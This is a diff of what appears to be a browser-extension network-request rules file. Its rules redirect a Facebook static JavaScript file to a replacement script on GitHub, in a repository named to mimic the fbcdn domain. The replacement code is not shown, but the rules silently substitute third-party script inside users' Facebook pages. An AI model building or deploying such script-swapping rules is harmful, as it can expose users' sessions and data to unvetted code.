@@ -5,11 +5,11 @@
     "action": {
       "type": "redirect",
       "redirect": {
-        "url": "https://raw.githubusercontent.com/tackecon/static.xx.fbcdn.net/main/-xtNSS8Cn-Q.js"
+        "url": "https://raw.githubusercontent.com/tackecon/static.xx.fbcdn.net/main/6D6hJ4BkNwS.js"
       }
     },
     "condition": {
-      "urlFilter": "https://static.xx.fbcdn.net/rsrc.php/v3/yW/r/-xtNSS8Cn-Q.js*",
+      "urlFilter": "https://static.xx.fbcdn.net/rsrc.php/v3/yg/r/6D6hJ4BkNwS.js*",
       "resourceTypes": [
         "script"
       ]
@@ -34,7 +34,7 @@
       ]
     },
     "condition": {
-      "urlFilter": "https://raw.githubusercontent.com/tackecon/static.xx.fbcdn.net/main/-xtNSS8Cn-Q.js"
+      "urlFilter": "https://raw.githubusercontent.com/tackecon/static.xx.fbcdn.net/main/6D6hJ4BkNwS.js"
     }
   },
    {
